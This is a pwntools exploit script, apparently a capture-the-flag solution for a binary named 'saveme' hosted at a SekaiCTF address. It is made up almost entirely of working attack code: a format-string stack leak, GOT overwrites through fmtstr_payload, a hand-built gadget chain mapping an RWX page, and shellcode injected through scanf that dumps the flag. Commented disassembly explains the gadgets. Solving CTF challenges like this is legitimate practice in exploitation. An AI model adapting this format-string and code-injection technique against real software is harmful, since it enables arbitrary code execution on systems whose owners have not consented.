#!/usr/bin/env python3

from pwn import *

context.binary = "./saveme"
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

def get_io():
    if args.REMOTE:
        io = remote("challs.ctf.sekai.team", 4001)
    elif args.STRACE:
        io = process(["strace", "-o", "strace.log", elf.path])
    else:
        io = process(elf.path)

    if args.GDB:
        gdb.attach(io, """
            # break *0x401531
            continue
        """)

    return io

def exec_fmt(payload):
    io = get_io()
    io.sendlineafter(b"option: ", b"2")
    io.sendlineafter(b"person:", payload)
    return io.recvuntil(b"\n")

class Gadgets:
    rwx_addr = 0x405000

# autofmt = FmtStr(exec_fmt)
# print(f"offset = {autofmt.offset}")

offset = 8
io = get_io()

io.recvuntil(b"gift: ")
stack_leak = int(io.recvuntil(b"    ", drop=True).decode(), 16)
log.info("Stack leak: %#x" % stack_leak)

io.sendlineafter(b"option: ", b"2")

def arb_write(writes, extra_data=None):
    fmt_str_payload = fmtstr_payload(offset, writes, write_size="short")
    if extra_data is not None:
        fmt_str_payload += extra_data

    log.info("fmt str payload len: %d" % len(fmt_str_payload))
    print(fmt_str_payload)

    assert b"\n" not in fmt_str_payload
    assert len(fmt_str_payload) <= 80

    io.sendlineafter(b"person: ", fmt_str_payload)

arb_write({
    stack_leak+0x50: elf.got.mmap,
    elf.got.putc: p8(0xbd) + p8(0x13),
})

# Load edi:
#
# 0040129a  bf00504000         mov     edi, 0x405000
# 0040129f  e8dcfdffff         call    mmap

# Move edi into stack offset:
#
# 0040121a  48897de8           mov     qword [rbp-0x18 {var_20}], rdi
# 0040121e  64488b0425280000…  mov     rax, qword [fs:0x28]
# 00401227  488945f8           mov     qword [rbp-0x8 {var_10}], rax
# 0040122b  31c0               xor     eax, eax  {0x0}
# 0040122d  488b059c2e0000     mov     rax, qword [rel stdin]
# 00401234  be00000000         mov     esi, 0x0
# 00401239  4889c7             mov     rdi, rax
# 0040123c  e84ffeffff         call    setbuf

# Move stack offset into rax:
#
# 00401269  488b45e8           mov     rax, qword [rbp-0x18 {var_20}]
# 0040126d  ba50000000         mov     edx, 0x50
# 00401272  be00000000         mov     esi, 0x0
# 00401277  4889c7             mov     rdi, rax
# 0040127a  e831feffff         call    memset

# Move rax into rsi
#
# 00401529  4889c6             mov     rsi, rax
# 0040152c  bf0a000000         mov     edi, 0xa
# 00401531  e8aafbffff         call    putc

# scanf write primitive:
#
# 00401500  488d3d990c0000     lea     rdi, [rel str_%80s]  {"%80s"}
# 00401507  b800000000         mov     eax, 0x0
# 0040150c  e8fffbffff         call    __isoc99_scanf

rop = b""
# mmap@GOT
rop += p64(0x0040121a)
# setbuf@GOT
rop += p64(0x00401269)
# printf@GOT
rop += p64(Gadgets.rwx_addr)
# memset@GOT
rop += p64(0x00401529)
# close@GOT
rop += p64(0x0040129a)
# read@GOT
rop += p64(elf.plt.read+6)
# putc@GOT
rop += p64(0x00401500)
# malloc@GOT
rop += p64(elf.plt.malloc+6)
# open64@GOT
rop += p64(0x004013bd)
# isoc99_scanf@GOT
rop += p64(elf.plt.__isoc99_scanf+6)

assert len(rop) <= 0x50
rop += b"F"*(0x50 - len(rop))
io.send(rop)

shellcode = "\n".join([
    # Get a heap address by calling malloc.
    "mov rax, 0x4010f0",
    "mov rdi, 0x50",
    "call rax",
    # Derive address of flag based on heap offset.
    "sub rax, 0x16c0",
    # Print flag.
    shellcraft.write(1, "rax", 0x50),
])
compiled_shellcode = asm(shellcode)
compiled_shellcode += b"\xcc"*(80 - len(compiled_shellcode))
io.send(compiled_shellcode)

io.interactive()
